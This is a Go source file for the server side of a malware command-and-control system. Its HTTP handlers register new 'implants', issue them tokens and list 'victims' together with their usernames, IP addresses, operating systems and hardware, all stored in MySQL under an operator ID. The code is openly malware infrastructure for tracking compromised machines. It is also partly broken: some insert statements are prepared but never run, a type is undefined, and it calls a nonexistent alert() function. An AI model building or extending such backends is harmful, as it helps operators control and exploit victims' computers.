package main

import (
	"crypto/md5"
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
)

// Define a structure above to handle JSON request/responses to list the victims that have connected to the database.
type ListDevices struct {
	Username        string `json:"Victim.username"`
	Network         string `json:"Network.ip_address"`
	OperatingSystem string `json:"Operating_System.name"`
	CPU             string `json:"CPU.architecture"`
	GPU             string `json:"GPU.information"`
	RAM             string `json:"RAM.amount"`
	Storage         string `json:"Storage.amount"`
}

// Define a Method for the Operator to see the list of implants connected
func getClients(w http.ResponseWriter, r *http.Request) {
	// Define query string to perform on the database
	sqlQuery := "SELECT Victim.username, " +
		"COALESCE(Network.ip_address, 'n/a') AS Network_ip_address, " +
		"COALESCE(Operating_System.name, 'n/a') AS Operating_System_name, " +
		"COALESCE(CPU.architecture, 'n/a') AS CPU_architecture, " +
		"COALESCE(GPU.information, 'n/a') AS GPU_information, " +
		"COALESCE(CAST(RAM.amount AS CHAR), 'n/a') AS RAM_amount, " + // Assuming RAM.amount is an integer
		"COALESCE(CAST(Storage.amount AS CHAR), 'n/a') AS Storage_amount " + // Assuming Storage.amount is an integer
		"FROM Victim " +
		"LEFT JOIN Network ON Victim.id = Network.victim_id " +
		"LEFT JOIN Operating_System ON Victim.id = Operating_System.victim_id " +
		"LEFT JOIN CPU ON Victim.id = CPU.victim_id " +
		"LEFT JOIN GPU ON Victim.id = GPU.victim_id " +
		"LEFT JOIN RAM ON Victim.id = RAM.victim_id " +
		"LEFT JOIN Storage ON Victim.id = Storage.victim_id"

	// Perform query using the db open connection to MySQL
	results, err := db.Query(sqlQuery)
	if err != nil {
		log.Fatal(err)
	}

	defer results.Close()

	var listDevices []ListDevices

	// For earch result in the result set of the query, append them into the ListDevices structure
	for results.Next() {
		var ld ListDevices
		err = results.Scan(&ld.Username, &ld.Network, &ld.OperatingSystem, &ld.CPU, &ld.GPU, &ld.RAM, &ld.Storage)
		if err != nil {
			panic(err.Error())
		}
		listDevices = append(listDevices, ld)
	}

	// Now that we have the list of victims in listDevices, marshal the structure to JSON
	jsonData, err := json.Marshal(listDevices)
	if err != nil {
		panic(err.Error())
	}

	// Send the response which will contain the JSON for all the victims connected as an item list
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)

	fmt.Println(string(jsonData))

	// Close the DB connection
	defer results.Close()

	fmt.Println("Success!")
}

// On hit, take the request and perform actions to then register it to the databas
func registerNewImplant(w http.ResponseWriter, r *http.Request) {

	// First, read the entire body
	bodyBytes, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Decode the body into the Device struct
	var device Device
	err = json.Unmarshal(bodyBytes, &device)
	if err != nil {
		http.Error(w, "Error decoding request body: "+err.Error(), http.StatusBadRequest)
		return
	}

	// Generate a random byte array
	randomBytes := make([]byte, 16) // 16 bytes for MD5
	if _, err := io.ReadFull(rand.Reader, randomBytes); err != nil {
		panic(err)
	}

	// Compute the MD5 hash of the random bytes
	hash := md5.New()
	hash.Write(randomBytes)
	md5String := hex.EncodeToString(hash.Sum(nil))

	// Check if the user already exists in the database
	var existingUserID int
	err = db.QueryRow("SELECT id FROM Victim WHERE username = ?", device.Username).Scan(&existingUserID)
	if err != nil {
		if err != sql.ErrNoRows {
			log.Printf("Error querying existing user: %v\n", err)
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
		// No existing user found; continue with registration
	} else {
		stmt, err := db.Prepare("SELECT token FROM Victim WHERE username = ?")
		if err != nil {
			log.Printf("Prepare error for select: %v\n", err)
			http.Error(w, "Failed to prepare select statement for retrieving token", http.StatusInternalServerError)
			return
		}

		// Execute the SELECT statement
		var token string
		err = stmt.QueryRow(device.Username).Scan(&token)
		if err != nil {
			log.Printf("Error executing select statement or scanning result: %v\n", err)
			http.Error(w, "Failed to retrieve token for victim", http.StatusInternalServerError)
			return
		}

		// Send the retrieved token in the response
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("token: " + token))
		return
	}

	fmt.Printf("Registering a new implant %s\n\n", device.DeviceName)

	// Prepare SQL statement for inserting into Victim table
	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id, token) VALUES (?, ?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	res, err := stmt.Exec(device.Username, device.OperatorID, md5String)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	victimID, err := res.LastInsertId()
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO CPU (architecture, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUArchitecture, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO GPU (information, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	stmt, err = db.Prepare("INSERT INTO RAM (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.RAMInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Storage (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	stmt, err = db.Prepare("INSERT INTO Operating_System (name, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.OSName, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Network (ip_address, mac_address, victim_id) VALUES (?, ?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.NetworkInfo, "", victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	// Additional logging to confirm the token was inserted
	log.Printf("Successfully inserted token: %s\n", md5String)

	// After all items are registered, we response with a success message
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("token: " + md5String))
	alert("New implant registered successfully")
}
